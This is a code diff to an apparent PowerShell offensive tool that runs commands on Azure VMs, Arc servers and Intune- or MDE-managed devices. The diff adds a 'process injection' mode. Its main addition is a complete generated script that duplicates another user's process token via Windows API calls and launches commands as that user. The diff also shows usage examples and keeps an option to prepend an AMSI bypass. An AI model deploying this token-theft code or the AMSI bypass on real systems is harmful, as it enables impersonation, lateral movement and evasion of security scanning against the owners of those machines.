@@ -75,7 +75,7 @@ function Invoke-RemoteCommandExecution {
         [ValidateSet("all", "running")]
         [string]$VMFilter = "running",
 
-        [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation")]
+        [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation", "pi")]
         [string]$ExecMethod = "auto",
 
         [switch]$PowerShell,
@@ -90,7 +90,12 @@ function Invoke-RemoteCommandExecution {
 
         [string]$ExportPath,
 
-        [string]$AmsiBypass
+        [string]$AmsiBypass,
+
+        # Process injection parameters (Azure equivalent of NetExec pi module)
+        [int]$PID,                     # Target process ID for token duplication
+
+        [string]$TargetUser            # Target user to impersonate (finds their process automatically)
     )
 
     # ============================================
@@ -295,8 +300,8 @@ function Invoke-RemoteCommandExecution {
         }
         # VM-centric targeting: -VMName or -AllVMs
         else {
-            if ($ExecMethod -eq "vmrun" -or $ExecMethod -eq "auto") {
-                # Get Azure VMs
+            if ($ExecMethod -in @("vmrun", "auto", "pi")) {
+                # Get Azure VMs (pi uses vmrun/arc as underlying delivery)
                 Write-ColorOutput -Message "[*] Retrieving Azure VMs..." -Color "Yellow"
 
                 try {
@@ -343,8 +348,8 @@ function Invoke-RemoteCommandExecution {
                 }
             }
 
-            if ($ExecMethod -eq "arc" -or $ExecMethod -eq "auto") {
-                # Get Arc-enabled servers
+            if ($ExecMethod -in @("arc", "auto", "pi")) {
+                # Get Arc-enabled servers (pi uses vmrun/arc as underlying delivery)
                 Write-ColorOutput -Message "[*] Retrieving Arc-enabled servers..." -Color "Yellow"
 
                 try {
@@ -400,8 +405,8 @@ function Invoke-RemoteCommandExecution {
             if ($targets.Count -eq 0 -and ($VMName -or $DeviceName)) {
                 $targetDevice = if ($VMName) { $VMName } else { $DeviceName }
 
-                # Try MDE if specified or auto mode
-                if ($ExecMethod -eq "mde" -or $ExecMethod -eq "auto") {
+                # Try MDE if specified or auto/pi mode (pi can use MDE as underlying delivery)
+                if ($ExecMethod -in @("mde", "auto", "pi")) {
                     Write-ColorOutput -Message "[*] Trying MDE Live Response for device: $targetDevice" -Color "Yellow"
 
                     $mdeToken = Get-MDEAccessToken
@@ -431,8 +436,8 @@ function Invoke-RemoteCommandExecution {
                     }
                 }
 
-                # Try Intune if specified or auto mode (and still no targets)
-                if ($targets.Count -eq 0 -and ($ExecMethod -eq "intune" -or $ExecMethod -eq "auto")) {
+                # Try Intune if specified or auto/pi mode (and still no targets) - pi can use Intune as underlying delivery
+                if ($targets.Count -eq 0 -and ($ExecMethod -in @("intune", "auto", "pi"))) {
                     Write-ColorOutput -Message "[*] Trying Intune for device: $targetDevice" -Color "Yellow"
 
                     # Ensure Graph connection with required permissions
@@ -521,49 +526,98 @@ function Invoke-RemoteCommandExecution {
                 continue
             }
 
-            # AMSI Bypass injection (only for PowerShell mode on Windows)
-            $bypassScript = ""
-            if ($AmsiBypass) {
-                if (-not $PowerShell) {
-                    Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to PowerShell mode (-PowerShell flag)" -Color "Yellow"
-                } elseif ($targetOS -ne "Windows") {
-                    Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to Windows targets" -Color "Yellow"
-                } else {
-                    if (-not (Test-Path $AmsiBypass)) {
-                        Write-ColorOutput -Message "    [!] AMSI bypass script not found: $AmsiBypass" -Color "Red"
-                        $failedExec++
-                        continue
-                    }
-                    Write-ColorOutput -Message "    [*] Loading AMSI bypass from: $AmsiBypass" -Color "Yellow"
-                    $bypassScript = (Get-Content -Path $AmsiBypass -Raw) + "`n"
-                    $bypassLines = (Get-Content $AmsiBypass).Count
-                    Write-ColorOutput -Message "    [+] AMSI bypass script loaded ($bypassLines lines)" -Color "Green"
+            # ============================================
+            # PROCESS INJECTION MODE (pi)
+            # ============================================
+            # Check if using process injection method
+            if ($ExecMethod -eq "pi") {
+                # Validate: Windows only
+                if ($targetOS -ne "Windows") {
+                    Write-ColorOutput -Message "    [!] Process injection only supported on Windows targets" -Color "Red"
+                    $failedExec++
+                    continue
                 }
+
+                # Validate: PID or TargetUser required
+                if ((-not $PID -or $PID -eq 0) -and -not $TargetUser) {
+                    Write-ColorOutput -Message "    [!] -PID or -TargetUser required for pi method" -Color "Red"
+                    Write-ColorOutput -Message "    [*] Example: -ExecMethod pi -PID 1234" -Color "Yellow"
+                    Write-ColorOutput -Message "    [*] Example: -ExecMethod pi -TargetUser 'DOMAIN\admin'" -Color "Yellow"
+                    $failedExec++
+                    continue
+                }
+
+                # Display PI mode info
+                Write-ColorOutput -Message "    [*] Execution Mode: Process Injection (pi)" -Color "Yellow"
+                if ($PID -and $PID -gt 0) {
+                    Write-ColorOutput -Message "    [*] Target PID: $PID" -Color "Cyan"
+                } else {
+                    Write-ColorOutput -Message "    [*] Target User: $TargetUser" -Color "Cyan"
+                }
+                Write-ColorOutput -Message "    [*] Method: Token duplication + CreateProcessWithTokenW" -Color "Gray"
+
+                # Generate the process injection script
+                $piScript = Get-ProcessInjectionScript -Command $x -PID $PID -TargetUser $TargetUser
+                $scriptContent = $piScript
+                $commandId = "RunPowerShellScript"
+
+                # Override method to use underlying delivery mechanism
+                $targetMethod = $target.Method
+                if ($targetMethod -eq "pi") {
+                    # Default to vmrun for VM targets, arc for Arc targets
+                    $targetMethod = if ($target.Type -eq "ArcServer" -or $target.Type -eq "ArcDevice") { "arc" } else { "vmrun" }
+                }
+
+                Write-ColorOutput -Message "    [*] Delivery method: $targetMethod" -Color "Gray"
             }
-
-            # Prepare command based on OS type and mode
-            $scriptContent = ""
-            $commandId = ""
-
-            if ($targetOS -eq "Windows") {
-                if ($PowerShell) {
-                    # PowerShell mode (-X equivalent) - prepend bypass if provided
-                    $scriptContent = $bypassScript + $x
-                    $commandId = "RunPowerShellScript"
-                } else {
-                    # Shell mode (-x equivalent) - wrap in cmd.exe (AMSI bypass not applicable)
-                    $scriptContent = "cmd.exe /c `"$x`""
-                    $commandId = "RunPowerShellScript"
+            # ============================================
+            # STANDARD EXECUTION MODES
+            # ============================================
+            else {
+                # AMSI Bypass injection (only for PowerShell mode on Windows)
+                $bypassScript = ""
+                if ($AmsiBypass) {
+                    if (-not $PowerShell) {
+                        Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to PowerShell mode (-PowerShell flag)" -Color "Yellow"
+                    } elseif ($targetOS -ne "Windows") {
+                        Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to Windows targets" -Color "Yellow"
+                    } else {
+                        if (-not (Test-Path $AmsiBypass)) {
+                            Write-ColorOutput -Message "    [!] AMSI bypass script not found: $AmsiBypass" -Color "Red"
+                            $failedExec++
+                            continue
+                        }
+                        Write-ColorOutput -Message "    [*] Loading AMSI bypass from: $AmsiBypass" -Color "Yellow"
+                        $bypassScript = (Get-Content -Path $AmsiBypass -Raw) + "`n"
+                        $bypassLines = (Get-Content $AmsiBypass).Count
+                        Write-ColorOutput -Message "    [+] AMSI bypass script loaded ($bypassLines lines)" -Color "Green"
+                    }
                 }
-            } else {
-                # Linux - shell mode
-                if ($PowerShell) {
-                    # PowerShell Core on Linux
-                    $scriptContent = "pwsh -Command `"$x`""
+
+                # Prepare command based on OS type and mode
+                $scriptContent = ""
+                $commandId = ""
+
+                if ($targetOS -eq "Windows") {
+                    if ($PowerShell) {
+                        # PowerShell mode (-X equivalent) - prepend bypass if provided
+                        $scriptContent = $bypassScript + $x
+                        $commandId = "RunPowerShellScript"
+                    } else {
+                        # Shell mode (-x equivalent) - wrap in cmd.exe (AMSI bypass not applicable)
+                        $scriptContent = "cmd.exe /c `"$x`""
+                        $commandId = "RunPowerShellScript"
+                    }
                 } else {
-                    $scriptContent = $x
+                    # Linux - shell mode
+                    if ($PowerShell) {
+                        # PowerShell Core on Linux
+                        $scriptContent = "pwsh -Command `"$x`""
+                    } else {
+                        $scriptContent = $x
+                    }
+                    $commandId = "RunShellScript"
                 }
-                $commandId = "RunShellScript"
             }
 
             Write-ColorOutput -Message "    [*] Executing command..." -Color "Yellow"
@@ -832,7 +886,28 @@ function Invoke-RemoteCommandExecution {
     Write-ColorOutput -Message "    mde:        MDE Live Response (async with polling - for MDE-enrolled devices)" -Color "Gray"
     Write-ColorOutput -Message "    intune:     Intune Proactive Remediation (async - for Intune-managed devices)" -Color "Gray"
     Write-ColorOutput -Message "    automation: Azure Automation Hybrid Worker (job-based - for Automation-configured)" -Color "Gray"
+    Write-ColorOutput -Message "    pi:         Process Injection via token duplication (execute as target user)" -Color "Gray"
     Write-ColorOutput -Message "    auto:       Auto-detect best method (Arc -> MDE -> Intune)" -Color "Gray"
+
+    Write-ColorOutput -Message "`n[*] PROCESS INJECTION (pi):" -Color "Yellow"
+    Write-ColorOutput -Message "    Azure equivalent of NetExec -M pi module" -Color "Gray"
+    Write-ColorOutput -Message "    Execute commands as a target user by duplicating their process token" -Color "Gray"
+    Write-ColorOutput -Message "" -Color "White"
+    Write-ColorOutput -Message "    Underlying Delivery:" -Color "White"
+    Write-ColorOutput -Message "      PI auto-detects and uses: vmrun -> arc -> mde -> intune" -Color "Gray"
+    Write-ColorOutput -Message "" -Color "White"
+    Write-ColorOutput -Message "    Usage:" -Color "White"
+    Write-ColorOutput -Message "      -ExecMethod pi -PID 1234           Inject into specific process" -Color "Gray"
+    Write-ColorOutput -Message "      -ExecMethod pi -TargetUser 'admin' Auto-find user's process" -Color "Gray"
+    Write-ColorOutput -Message "" -Color "White"
+    Write-ColorOutput -Message "    Examples:" -Color "White"
+    Write-ColorOutput -Message "      .\azx.ps1 exec -VMName 'vm-01' -x 'whoami' -ExecMethod pi -PID 1234" -Color "Gray"
+    Write-ColorOutput -Message "      .\azx.ps1 exec -VMName 'vm-01' -x 'whoami' -ExecMethod pi -TargetUser 'DOMAIN\admin'" -Color "Gray"
+    Write-ColorOutput -Message "      .\azx.ps1 exec -DeviceName 'LAPTOP' -x 'whoami' -ExecMethod pi -TargetUser 'admin'" -Color "Gray"
+    Write-ColorOutput -Message "" -Color "White"
+    Write-ColorOutput -Message "    NetExec Equivalent:" -Color "White"
+    Write-ColorOutput -Message "      nxc smb <target> -M pi -o PID=1234 EXEC=cmd" -Color "Gray"
+    Write-ColorOutput -Message "      nxc smb <target> -M pi -o USER=admin EXEC=cmd" -Color "Gray"
 
     Write-ColorOutput -Message "`n[*] REQUIRED PERMISSIONS:" -Color "Yellow"
     Write-ColorOutput -Message "    VM Run Command:  Virtual Machine Contributor or Reader + VM Command Executor" -Color "Gray"
@@ -1195,6 +1270,335 @@ function Invoke-IntuneRemediation {
             ScriptId = $null
         }
     }
+}
+
+# ============================================
+# PROCESS INJECTION FUNCTIONS (Token Manipulation)
+# ============================================
+
+<#
+.SYNOPSIS
+    Generate a PowerShell script for process injection via token duplication.
+.DESCRIPTION
+    Creates a PowerShell script that uses P/Invoke to:
+    1. Find a process owned by the target user (or use provided PID)
+    2. Open the process and its token
+    3. Duplicate the token with SecurityImpersonation level
+    4. Create a new process with the duplicated token
+    5. Execute the specified command in the impersonated context
+
+    This is the Azure equivalent of NetExec's process injection (pi) module.
+    Since Azure doesn't provide direct memory access, we achieve the same outcome
+    (execute as target user) through token manipulation techniques.
+#>
+function Get-ProcessInjectionScript {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Command,
+
+        [int]$PID,
+
+        [string]$TargetUser
+    )
+
+    # PowerShell script that performs token duplication and process creation
+    $script = @'
+# Process Injection Script - Token Duplication Method
+# Azure equivalent of NetExec's -M pi module
+# Executes command as target user by duplicating their process token
+
+$ErrorActionPreference = "Stop"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.ComponentModel;
+
+public class TokenManipulation {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool DuplicateTokenEx(
+        IntPtr hExistingToken,
+        uint dwDesiredAccess,
+        IntPtr lpTokenAttributes,
+        int ImpersonationLevel,
+        int TokenType,
+        out IntPtr phNewToken);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessWithTokenW(
+        IntPtr hToken,
+        uint dwLogonFlags,
+        string lpApplicationName,
+        string lpCommandLine,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    // Token access rights
+    public const uint TOKEN_DUPLICATE = 0x0002;
+    public const uint TOKEN_QUERY = 0x0008;
+    public const uint TOKEN_IMPERSONATE = 0x0004;
+    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
+    public const uint MAXIMUM_ALLOWED = 0x02000000;
+
+    // Process access rights
+    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
+    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
+
+    // Impersonation levels
+    public const int SecurityAnonymous = 0;
+    public const int SecurityIdentification = 1;
+    public const int SecurityImpersonation = 2;
+    public const int SecurityDelegation = 3;
+
+    // Token types
+    public const int TokenPrimary = 1;
+    public const int TokenImpersonation = 2;
+
+    // Wait constants
+    public const uint INFINITE = 0xFFFFFFFF;
+    public const uint WAIT_OBJECT_0 = 0x00000000;
+}
+"@ -ErrorAction SilentlyContinue
+
+$targetPID = TARGETPID_PLACEHOLDER
+$targetUser = "TARGETUSER_PLACEHOLDER"
+$commandToRun = @"
+COMMAND_PLACEHOLDER
+"@
+
+Write-Output "[*] Process Injection Module - Token Duplication Method"
+Write-Output "[*] Azure equivalent of NetExec -M pi"
+Write-Output ""
+
+# Find target process if TargetUser specified
+if ($targetPID -eq 0 -and $targetUser -ne "") {
+    Write-Output "[*] Searching for process owned by: $targetUser"
+
+    $foundProcess = $null
+    $processes = Get-Process | Where-Object { $_.Id -ne $PID }
+
+    foreach ($proc in $processes) {
+        try {
+            # Get process owner via WMI
+            $wmiProc = Get-WmiObject Win32_Process -Filter "ProcessId=$($proc.Id)" -ErrorAction SilentlyContinue
+            if ($wmiProc) {
+                $owner = $wmiProc.GetOwner()
+                if ($owner.ReturnValue -eq 0) {
+                    $procOwner = $owner.User
+                    $procDomain = $owner.Domain
+                    $fullOwner = "$procDomain\$procOwner"
+
+                    # Match against various formats
+                    if ($procOwner -eq $targetUser -or
+                        $fullOwner -eq $targetUser -or
+                        $fullOwner -like "*\$targetUser") {
+                        $foundProcess = $proc
+                        Write-Output "[+] Found process $($proc.Id) ($($proc.ProcessName)) owned by $fullOwner"
+                        $targetPID = $proc.Id
+                        break
+                    }
+                }
+            }
+        } catch {
+            # Skip inaccessible processes
+            continue
+        }
+    }
+
+    if (-not $foundProcess) {
+        Write-Output "[!] No process found for user: $targetUser"
+        Write-Output "[*] Ensure the user has an active session on this machine"
+        exit 1
+    }
+}
+
+if ($targetPID -eq 0) {
+    Write-Output "[!] Error: No target PID specified and no user process found"
+    exit 1
+}
+
+Write-Output "[*] Target PID: $targetPID"
+
+# Open target process
+$hProcess = [TokenManipulation]::OpenProcess(
+    [TokenManipulation]::PROCESS_QUERY_LIMITED_INFORMATION,
+    $false,
+    $targetPID
+)
+
+if ($hProcess -eq [IntPtr]::Zero) {
+    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    Write-Output "[!] Failed to open process $targetPID (Error: $errorCode)"
+
+    # Try with PROCESS_QUERY_INFORMATION for older Windows versions
+    $hProcess = [TokenManipulation]::OpenProcess(
+        [TokenManipulation]::PROCESS_QUERY_INFORMATION,
+        $false,
+        $targetPID
+    )
+
+    if ($hProcess -eq [IntPtr]::Zero) {
+        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Output "[!] Also failed with PROCESS_QUERY_INFORMATION (Error: $errorCode)"
+        exit 1
+    }
+}
+
+Write-Output "[+] Process handle obtained"
+
+# Open process token
+$hToken = [IntPtr]::Zero
+$tokenAccess = [TokenManipulation]::TOKEN_DUPLICATE -bor [TokenManipulation]::TOKEN_QUERY
+
+if (-not [TokenManipulation]::OpenProcessToken($hProcess, $tokenAccess, [ref]$hToken)) {
+    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    Write-Output "[!] Failed to open process token (Error: $errorCode)"
+    [TokenManipulation]::CloseHandle($hProcess) | Out-Null
+    exit 1
+}
+
+Write-Output "[+] Process token obtained"
+
+# Duplicate token as primary token
+$hNewToken = [IntPtr]::Zero
+$dupResult = [TokenManipulation]::DuplicateTokenEx(
+    $hToken,
+    [TokenManipulation]::MAXIMUM_ALLOWED,
+    [IntPtr]::Zero,
+    [TokenManipulation]::SecurityImpersonation,
+    [TokenManipulation]::TokenPrimary,
+    [ref]$hNewToken
+)
+
+if (-not $dupResult) {
+    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    Write-Output "[!] Failed to duplicate token (Error: $errorCode)"
+    [TokenManipulation]::CloseHandle($hToken) | Out-Null
+    [TokenManipulation]::CloseHandle($hProcess) | Out-Null
+    exit 1
+}
+
+Write-Output "[+] Token duplicated successfully"
+
+# Create process with the duplicated token
+$si = New-Object TokenManipulation+STARTUPINFO
+$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+$pi = New-Object TokenManipulation+PROCESS_INFORMATION
+
+# Build command line
+$cmdLine = "cmd.exe /c $commandToRun"
+Write-Output "[*] Executing: $cmdLine"
+
+$createResult = [TokenManipulation]::CreateProcessWithTokenW(
+    $hNewToken,
+    0,  # dwLogonFlags
+    $null,  # lpApplicationName
+    $cmdLine,
+    0,  # dwCreationFlags
+    [IntPtr]::Zero,  # lpEnvironment
+    $null,  # lpCurrentDirectory
+    [ref]$si,
+    [ref]$pi
+)
+
+if ($createResult) {
+    Write-Output "[+] Process created with impersonated token"
+    Write-Output "[+] New process PID: $($pi.dwProcessId)"
+
+    # Wait for process to complete (max 30 seconds)
+    $waitResult = [TokenManipulation]::WaitForSingleObject($pi.hProcess, 30000)
+
+    if ($waitResult -eq [TokenManipulation]::WAIT_OBJECT_0) {
+        $exitCode = 0
+        [TokenManipulation]::GetExitCodeProcess($pi.hProcess, [ref]$exitCode) | Out-Null
+        Write-Output "[+] Process completed with exit code: $exitCode"
+    } else {
+        Write-Output "[*] Process still running after 30 seconds"
+    }
+
+    # Cleanup process handles
+    [TokenManipulation]::CloseHandle($pi.hProcess) | Out-Null
+    [TokenManipulation]::CloseHandle($pi.hThread) | Out-Null
+} else {
+    $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    Write-Output "[!] CreateProcessWithTokenW failed (Error: $errorCode)"
+
+    # Provide guidance based on error code
+    switch ($errorCode) {
+        5 { Write-Output "[*] Access denied - ensure running as SYSTEM" }
+        1314 { Write-Output "[*] Required privilege not held - SeAssignPrimaryTokenPrivilege needed" }
+        default { Write-Output "[*] Try running with SYSTEM privileges" }
+    }
+}
+
+# Cleanup
+[TokenManipulation]::CloseHandle($hNewToken) | Out-Null
+[TokenManipulation]::CloseHandle($hToken) | Out-Null
+[TokenManipulation]::CloseHandle($hProcess) | Out-Null
+
+Write-Output ""
+Write-Output "[*] Token manipulation completed"
+'@
+
+    # Replace placeholders in the script
+    $script = $script -replace 'TARGETPID_PLACEHOLDER', $(if ($PID -and $PID -gt 0) { $PID } else { '0' })
+    $script = $script -replace 'TARGETUSER_PLACEHOLDER', $(if ($TargetUser) { $TargetUser } else { '' })
+
+    # Escape the command for embedding in here-string
+    $escapedCommand = $Command -replace '"', '""'
+    $script = $script -replace 'COMMAND_PLACEHOLDER', $escapedCommand
+
+    return $script
 }
 
 # ============================================
